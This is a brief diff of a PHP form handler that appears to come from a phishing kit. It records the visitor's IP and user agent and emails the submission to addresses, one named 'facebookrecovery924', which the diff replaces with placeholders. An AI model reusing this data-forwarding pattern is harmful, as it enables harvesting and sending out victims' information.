@@ -11,8 +11,8 @@ if(isset($_POST['submit']));
   $ip = $_SERVER['REMOTE_ADDR'];
   $user = $_SERVER['HTTP_USER_AGENT'];
   
-  $mailTo = "facebookrecovery924@gmail.com";
-  $mail2 = "kurtmathewmontecino@gmail.com";
+  $mailTo = "email1";
+  $mail2 = "email2";
   $headers = array ("From:".$mailfrom,
   "MIME-Version: 1.0",
   "X-Priority" => "1",
